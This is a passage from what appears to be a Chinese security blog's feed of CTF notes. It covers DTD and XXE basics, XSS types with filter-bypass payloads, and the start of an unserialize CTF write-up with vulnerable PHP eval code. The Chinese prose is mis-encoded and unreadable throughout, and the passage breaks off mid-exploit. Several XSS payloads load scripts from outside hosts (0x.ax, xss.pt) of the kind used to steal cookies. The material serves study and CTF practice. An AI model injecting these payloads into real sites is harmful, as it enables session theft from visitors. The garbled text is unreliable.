æ–‡æ¡£ä¸­ï¼Œä¹Ÿå¯ä½œä¸ºä¸€ä¸ªå¤–éƒ¨å¼•ç”¨ã€‚</strong></p><p>å†…éƒ¨çš„ DOCTYPE å£°æ˜</p><p>å‡å¦‚ DTD è¢«åŒ…å«åœ¨æ‚¨çš„ XML æºæ–‡ä»¶ä¸­ï¼Œå®ƒåº”å½“é€šè¿‡ä¸‹é¢çš„è¯­æ³•åŒ…è£…åœ¨ä¸€ä¸ª DOCTYPE å£°æ˜ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  [å…ƒç´ å£°æ˜]&gt;</span><br></pre></td></tr></table></figure><p>å¸¦æœ‰ DTD çš„ XML æ–‡æ¡£å®ä¾‹ï¼ˆè¯·åœ¨ IE5 ä»¥åŠæ›´é«˜çš„ç‰ˆæœ¬æ‰“å¼€ï¼Œå¹¶é€‰æ‹©æŸ¥çœ‹æºä»£ç ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;George&lt;/to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;/from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><em>!DOCTYPE note</em> (ç¬¬äºŒè¡Œ)å®šä¹‰æ­¤æ–‡æ¡£æ˜¯ <em>note</em> ç±»å‹çš„æ–‡æ¡£ã€‚</p><p><em>!ELEMENT note</em> (ç¬¬ä¸‰è¡Œ)å®šä¹‰ <em>note</em> å…ƒç´ æœ‰å››ä¸ªå…ƒç´ ï¼šâ€toã€fromã€heading,ã€bodyâ€</p><p><em>!ELEMENT to</em> (ç¬¬å››è¡Œ)å®šä¹‰ <em>to</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT from</em> (ç¬¬äº”è¡Œ)å®šä¹‰ <em>from</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT heading</em> (ç¬¬å…­è¡Œ)å®šä¹‰ <em>heading</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p><em>!ELEMENT body</em> (ç¬¬ä¸ƒè¡Œ)å®šä¹‰ <em>body</em> å…ƒç´ ä¸º â€œ#PCDATAâ€ ç±»å‹</p><p>###å¤–éƒ¨æ–‡æ¡£å£°æ˜</p><p>å‡å¦‚ DTD ä½äº XML æºæ–‡ä»¶çš„å¤–éƒ¨ï¼Œé‚£ä¹ˆå®ƒåº”é€šè¿‡ä¸‹é¢çš„è¯­æ³•è¢«å°è£…åœ¨ä¸€ä¸ª DOCTYPE å®šä¹‰ä¸­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´  SYSTEM &quot;æ–‡ä»¶å&quot;&gt;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª XML æ–‡æ¡£å’Œä¸Šé¢çš„ XML æ–‡æ¡£ç›¸åŒï¼Œä½†æ˜¯æ‹¥æœ‰ä¸€ä¸ªå¤–éƒ¨çš„ DTD: ï¼ˆ<a href="https://www.w3school.com.cn/dtd/note_ex_dtd.xml">åœ¨ IE5 ä¸­æ‰“å¼€</a>ï¼Œå¹¶é€‰æ‹©â€œæŸ¥çœ‹æºä»£ç â€å‘½ä»¤ã€‚ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;note.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget the meeting!&lt;/body&gt;</span><br><span class="line">&lt;/note&gt; </span><br></pre></td></tr></table></figure><p>è¿™æ˜¯åŒ…å« DTD çš„ â€œnote.dtdâ€ æ–‡ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure><p>é™„ä¸Šå®ä¾‹ï¼š</p><pre><code>å†…éƒ¨å®ä½“å£°æ˜DTD å®ä¾‹:&lt;!ENTITY writer &quot;Donald Duck.&quot;&gt; &lt;!ENTITY copyright &quot;Copyright runoob.com&quot;&gt;XML å®ä¾‹ï¼š&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;å¤–éƒ¨å®ä½“å£°æ˜DTD å®ä¾‹:&lt;!ENTITY writer SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt; &lt;!ENTITY copyright SYSTEM &quot;http://www.runoob.com/entities.dtd&quot;&gt;XML å®ä¾‹:&lt;author&gt;&amp;writer;&amp;copyright;&lt;/author&gt;</code></pre><p>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ: ä¸€ä¸ªå’Œå· (&amp;), ä¸€ä¸ªå®ä½“åç§°, ä»¥åŠä¸€ä¸ªåˆ†å·ï¼ˆ;ï¼‰</p><p>xxeä¸»è¦æ˜¯åˆ©ç”¨äº†DTDå¼•ç”¨å¤–éƒ¨å®ä½“å¯¼è‡´çš„æ¼æ´</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ”»å‡»</title>
      <link href="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/"/>
      <url>/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p>#XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ”»å‡»</p><p>è·¨ç«™è„šæœ¬(Cross-site Scripting )æ”»å‡»ï¼Œæ”»å‡»è€…é€šè¿‡ç½‘ç«™æ³¨å…¥ç‚¹æ³¨å…¥å®¢æˆ·ç«¯å¯æ‰§è¡Œè§£æçš„payload(è„šæœ¬ä»£ç ï¼‰ï¼Œå½“ç”¨æˆ·è®¿é—®ç½‘é¡µæ—¶ï¼Œæ¶æ„payloadè‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œï¼Œä»¥è¾¾åˆ°æ”»å‡»è€…ç›®çš„ï¼ˆçªƒå–cookieã€æ¶æ„ä¼ æ’­ã€é’“é±¼æ¬ºéª—ç­‰ï¼‰ã€‚<br>ä¸ºäº†é¿å…ä¸HTMLè¯­è¨€ä¸­çš„CSSç›¸æ··æ·†ï¼Œé€šå¸¸ç§°å®ƒä¸ºâ€XSSâ€ã€‚</p><p>XSSåˆ†ä¸ºï¼šå­˜å‚¨å‹ ã€åå°„å‹ ã€DOMå‹XSS</p><p>###åå°„æ€§XSS</p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230915195201845-1700990490828-305.png"></p><p>éæŒä¹…åŒ–ï¼Œä»…æ‰§è¡Œä¸€æ¬¡ï¼Œéœ€è¦æ¬ºéª—ç”¨æˆ·è‡ªå·±å»ç‚¹å‡»é“¾æ¥æ‰èƒ½è§¦å‘XSSä»£ç ï¼ˆæœåŠ¡å™¨ä¸­æ²¡æœ‰è¿™æ ·çš„é¡µé¢å’Œå†…å®¹ï¼‰ï¼Œä¸€èˆ¬å®¹æ˜“å‡ºç°åœ¨æœç´¢é¡µé¢<br>DOMå‹XSSï¼šä¸ç»è¿‡åç«¯ï¼ŒDOM-XSSæ¼æ´æ˜¯åŸºäºæ–‡æ¡£å¯¹è±¡æ¨¡å‹(Document Objeet Model,DOM)çš„ä¸€ç§æ¼æ´ï¼ŒDOM-XSSæ˜¯é€šè¿‡urlä¼ å…¥å‚æ•°å»æ§åˆ¶è§¦å‘çš„ï¼Œå…¶å®ä¹Ÿå±äºåå°„å‹XSSã€‚<br>æ”»å‡»æµç¨‹ï¼šæ”»å‡»è€…-&gt;å‘ç°å­˜åœ¨åå°„æ€§XSS-&gt;æ ¹æ®è¾“å‡ºç‚¹ç¯å¢ƒæ„é€ xssä»£ç -&gt;è¿›è¡Œä»£ç ç¼©çŸ­ï¼ˆå¯æœ‰å¯æ— ï¼Œä»…ä¸ºäº†å¢åŠ è¿·æƒ‘æ€§ï¼‰-&gt;å‘é€ç»™å—å®³è€…-&gt;å—å®³è€…ç‚¹å¼€é“¾æ¥ï¼Œxssä»£ç æ‰§è¡Œå®Œæˆæ”»å‡»è€…ä»£ç å·¥å…·ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;hello,è¾“å…¥åä¼šå˜æˆä¸€çº§æ ‡é¢˜</span><br></pre></td></tr></table></figure><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916112206026-1700990490828-307.png"></p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916112226123-1700990490828-306.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">è¿‡æ»¤&lt;script&gt;,æ¢ä¸ºç©º</span><br><span class="line">&lt;sc&lt;script&gt;ript&gt;alertï¼ˆ1ï¼‰&lt;/script&gt;</span><br><span class="line">æ¢å®Œä¹‹åä¸º&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">åŒ¹é…å¤§å°å†™</span><br><span class="line">&lt;Script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">å¯¹æ ‡ç­¾&lt;script&gt;è¿›è¡Œè¿‡æ»¤,å¯ä»¥ç”¨å…¶ä»–æ ‡ç­¾</span><br><span class="line">&lt;img src=1 onerror =alert(1)/&gt;</span><br><span class="line">é˜²å¾¡ï¼š</span><br><span class="line">htmlè½¬æ¢å­—ç¬¦</span><br><span class="line">$name=ntmlspecialchars($name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ctfhub </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;sCRiPt sRC=//0x.ax/J5ddFe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h3 id="å­˜å‚¨å‹XSS"><a href="#å­˜å‚¨å‹XSS" class="headerlink" title="å­˜å‚¨å‹XSS"></a>å­˜å‚¨å‹XSS</h3><p>ç‰¹ç‚¹ï¼šæŒä¹…å‹</p><p>ä¸»è¦å­˜åœ¨ä»¥æ”»å‡»è€…å°†é¢æ¶æ„è„šæœ¬å­˜å‚¨åˆ°æœåŠ¡å™¨çš„æ•°æ®åº“ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®åŒ…å«æ¶æ„ç›¸å…³æ•°æ®çš„é¡µé¢æ—¶ï¼ŒæœåŠ¡ç«¯æœªç»ä¸¥ä¸ªè¿‡æ»¤å¤„ç†è€Œè¾“å‡ºåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­ï¼Œå¯¼è‡´æµè§ˆå™¨æ‰§è¡Œä»£ç æ•°æ®</p><p>å¤šè§äºè¯„è®ºç•™è¨€æ¡†å¤„</p><script>alert(1)</script>æœåŠ¡å™¨å°†å®ƒå­˜å‚¨äºæ•°æ®åº“ä¸­ï¼Œæ¯æ¬¡è®¿é—®éƒ½ä¼šè¿›è¡Œå¼¹çª—ï¼Œæ²¡æ¬¡éƒ½æ˜¯ä»æ•°æ®åº“é‡ŒæŸ¥è¯¢è¿™æ¡è¯­å¥ï¼Œå¹¶ä¸”æ˜¾ç¤ºå‡ºæ¥ï¼Œ<p>å½±å“èŒƒå›´å¹¿ï¼Œæ¯ä¸ªäººè®¿é—®è¿™ä¸ªç½‘ç«™éƒ½ä¼šä»æ•°æ®åº“æå–ä¿¡æ¯</p><p>é˜²å¾¡ï¼š</p><blockquote><p>trim(string[, charlist]):<br>å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–é¢„å®šä¹‰å­—ç¬¦( \t. \n.\xOBã€\r)stripslashes(string) :<br>ç§»é™¤å­—ç¬¦ä¸²ä¸­çš„åæ–œæ <br>mysqli_real_escape_string(connection, string) :<br>å¯¹å­—ç¬¦ä¸²ä¸­sqlçš„ç‰¹æ®Šç¬¦å·(ixoo , \n , lr , ,ï¼Œâ€, x1a )è¿›è¡Œè½¬ä¹‰<br>strip_tags(string, allow)å‡½æ•°å‰¥å»å­—ç¬¦ä¸²ä¸­çš„HTMLã€XMLä»¥åŠ PHPçš„æ ‡ç­¾;<br>addslashes(string)è¿”å›åœ¨é¢„å®šä¹‰å­—ç¬¦(å•å¼•å·ã€åŒå¼•å·ã€åæ–œæ ã€NULL)ä¹‹å‰æ·»åŠ åæ–œæ çš„å­—ç¬¦ä¸²;è¿˜æœ‰æœ€åä¸€é“htmlspecialchars()å‡½æ•°ï¼Œè®©ä½ ä¸å¾—ç¿»èº«ã€‚</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;/tExtArEa&gt;&#x27;&quot;&gt;&lt;sCRiPt sRC=https://0x.ax/J5ddFe&gt;&lt;/sCrIpT&gt;</span><br></pre></td></tr></table></figure><h3 id="DOMå‹XSS"><a href="#DOMå‹XSS" class="headerlink" title="DOMå‹XSS"></a>DOMå‹XSS</h3><p>ç‰¹ç‚¹ï¼šé€šè¿‡JavaScriptæ“ä½œdocumentï¼Œå®ç°domæ•°çš„é‡æ„</p><p>ä¸»è¦å­˜åœ¨ä¸ç”¨æˆ·èƒ½ä¿®é¡µé¢çš„domï¼Œé€ æˆå®¢æˆ·ç«¯playloadåœ¨æµè§ˆå™¨ä¸­è¿è¡Œ</p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916142202534-1700990490828-308.png"></p><p>å…³é”®ä»£ç </p><p><img src="/2023/08/17/XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/image/image-20230916142627972-1700990490828-309.png"></p><p>ç°åœ¨ç¬¬ä¸€ä¸ªæ¡†æäº¤â€™; <sCRiPt src="//xss.pt/J5ddFe">//</p><p>æ ¹æ®æºç ';å°†æ¡†èµ·æ¥çš„è¯­å¥é—­åˆï¼Œåé¢å‘¢//ä¼šæ³¨é‡Šï¼Œå°†ä¸å‰é¢<sCrIpT>é—­åˆ</p><sCRiPt sRC=//xss.pt/J5ddFe>//åˆä¸å‰é¢é—­åˆ</sCrIpT></sCRiPt></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023å·…å³°æå®¢ Unserialize  Wp</title>
      <link href="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/"/>
      <url>/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2023å·…å³°æå®¢-unserialize-wp"><a href="#2023å·…å³°æå®¢-unserialize-wp" class="headerlink" title="2023å·…å³°æå®¢ unserialize  wp"></a>2023å·…å³°æå®¢ unserialize  wp</h1><p>åå°æ‰«æå‘ç°<img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810173524265-1700990497600-315.png"></p><p>è®¿é—®<a href="http://www.zipä¸‹è½½æ‹¿åˆ°æºç my.php/">www.zipä¸‹è½½æ‹¿åˆ°æºç my.php</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class pull_it &#123;</span><br><span class="line">    private $x;</span><br><span class="line"></span><br><span class="line">â€‹    function __construct($xx) &#123;</span><br><span class="line">â€‹       $this-&gt;x = $xx;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    function __destruct() &#123;</span><br><span class="line">â€‹       if ($this-&gt;x) &#123;</span><br><span class="line">â€‹          $preg_match = &#x27;return preg_match(&quot;/[A-Za-z0-9]+/i&quot;, $this-&gt;x);&#x27;;</span><br><span class="line">â€‹       if (eval($preg_match)) &#123;</span><br><span class="line">â€‹          echo $preg_match;</span><br><span class="line">â€‹          exit(&quot;save_waf&quot;);</span><br><span class="line">â€‹       &#125;</span><br><span class="line">â€‹       @eval($this-&gt;x);</span><br><span class="line">â€‹       &#125;</span><br><span class="line">â€‹    &#125;  </span><br><span class="line">&#125;</span><br><span class="line">class push_it &#123;</span><br><span class="line">â€‹    private $root;</span><br><span class="line">â€‹    private $pwd;</span><br><span class="line"></span><br><span class="line">â€‹    function __construct($root, $pwd) &#123;</span><br><span class="line">â€‹       $this-&gt;root = $root;</span><br><span class="line">â€‹       $this-&gt;pwd = $pwd;</span><br><span class="line">â€‹    &#125;</span><br><span class="line">â€‹    </span><br><span class="line">â€‹       function __destruct() &#123;</span><br><span class="line">â€‹       unset($this-&gt;root);</span><br><span class="line">â€‹       unset($this-&gt;pwd);</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line">â€‹    function __toString() &#123;</span><br><span class="line">â€‹       if (isset($this-&gt;root) &amp;&amp; isset($this-&gt;pwd)) &#123;</span><br><span class="line">â€‹          echo &quot;&lt;h1&gt;Hello, $this-&gt;root&lt;/h1&gt;&quot;;</span><br><span class="line">â€‹       &#125;</span><br><span class="line">â€‹       else &#123;</span><br><span class="line">â€‹          echo &quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;;</span><br><span class="line">â€‹       &#125;</span><br><span class="line">â€‹    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>â€‹    index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;my.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;login.html&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$root</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;root&#x27;</span>];</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pwd&#x27;</span>];</span><br><span class="line">    <span class="variable">$login</span> = <span class="keyword">new</span> <span class="title function_ invoke__">push_it</span>(<span class="variable">$root</span>, <span class="variable">$pwd</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>] = <span class="title function_ invoke__">b</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$login</span>));</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;&lt;script&gt;location.href=`./login.php`;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;aaaa&#x27;</span>, <span class="string">&#x27;bbbbbb&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;bbbbbb&#x27;</span>, <span class="string">&#x27;aaaa&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>my.phpé‡Œçš„pull_itæ˜¯æ¶æ„ç±»ï¼Œèƒ½æ§åˆ¶$this-&gt;xå°±èƒ½å‘½ä»¤æ‰§è¡Œï¼Œè¿™é‡Œæ˜¯æ— å­—æ¯æ•°å­—å‘½ä»¤æ‰§è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">push_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$root</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pwd</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$root</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;root = <span class="variable">$root</span>;</span><br><span class="line">   <span class="variable language_">$this</span>-&gt;pwd = <span class="variable">$pwd</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;root);</span><br><span class="line">   <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;pwd);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;root) &amp;&amp; <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;pwd)) &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Hello, <span class="subst">$this</span>-&gt;root&lt;/h1&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;out!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index.phpé‡Œå¯¹ä¼ å…¥çš„å‚æ•°å…ˆåšåºåˆ—åŒ–å­˜å‚¨åœ¨$_SESSIONé‡Œï¼Œå¹¶ç”¨bå‡½æ•°æ›¿æ¢å­—ç¬¦</p><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810174134098-1700990497600-317.png"></p><p>å½“è®¿é—®login.phpæ—¶ï¼Œä¼šå…ˆæ›¿æ¢å­—ç¬¦å†åšååºåˆ—åŒ–</p><p><img src="/2023/08/10/2023%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%20unserialize%20%20wp/image/image-20230810174205139-1700990497600-316.png"></p><p>aå‡½æ•°å’Œbå‡½æ•°éƒ½æ˜¯å­—ç¬¦ä¸²æ›¿æ¢ï¼Œæ•°é‡ä¸ä¸€è‡´å¾ˆæ˜æ˜¾å­˜åœ¨å­—ç¬¦ä¸²é€ƒé€¸ã€‚ä¸€ä¸ªæ˜¯bå­—ç¬¦ä¸²ç”±çŸ­å˜é•¿ï¼Œç¬¬äºŒä¸ªaå‡½æ•°æ˜¯ç”±é•¿å˜çŸ­ï¼Œæˆ‘ä»¬è¿™é‡Œåˆ©ç”¨aå‡½æ•°</p><p>è‡ªå·±çš„åšæ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pull_it</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span 